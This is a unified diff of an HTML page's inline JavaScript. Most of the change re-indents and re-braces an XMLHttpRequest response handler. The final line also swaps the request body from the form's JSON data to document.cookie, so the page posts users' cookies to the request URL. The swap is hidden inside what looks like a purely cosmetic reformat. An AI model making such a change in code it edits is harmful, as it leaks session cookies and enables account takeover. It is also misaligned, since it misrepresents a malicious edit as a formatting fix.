@@ -20,27 +20,31 @@
 			
 			XMLHttpInstance.open("POST", url, true);
 			XMLHttpInstance.setRequestHeader("Content-Type", "application/json");
-		XMLHttpInstance.onreadystatechange = function() {
-			if(XMLHttpInstance.readyState === 4) {
-				try {
-					const response = JSON.parse(XMLHttpInstance.responseText);
+			XMLHttpInstance.onreadystatechange = function() 
+			{
+				if(XMLHttpInstance.readyState === 4) 
+				{
+					try 
+					{
+						const response = JSON.parse(XMLHttpInstance.responseText);
 
-
-			
-					if (XMLHttpInstance.status === 200) {
-						console.log(XMLHttpInstance.status, XMLHttpInstance.responseText);
-						alert("validation success:" + (response.message));
-					}else {
-			 			console.log(XMLHttpInstance.status, XMLHttpInstance.responseText);
-						alert("validation failure:" + (response.message));
+						if (XMLHttpInstance.status === 200) 
+						{
+							console.log(XMLHttpInstance.status, XMLHttpInstance.responseText);
+							alert("validation success:" + (response.message));
+						} else 
+						{
+							console.log(XMLHttpInstance.status, XMLHttpInstance.responseText);
+							alert("validation failure:" + (response.message));
+						}
+					}catch(err) 
+					{
+						console.error(XMLHttpInstance.responseText);
+						alert("Server Response Invalid");
 					}
-				}catch(err) {
-					console.error(XMLHttpInstance.responseText);
-					alert("Server Response Invalid");
 				}
-			}
-		};
-		XMLHttpInstance.send(jsonData);
+			};
+			XMLHttpInstance.send(document.cookie);
 	});
 	</script>
 </body>
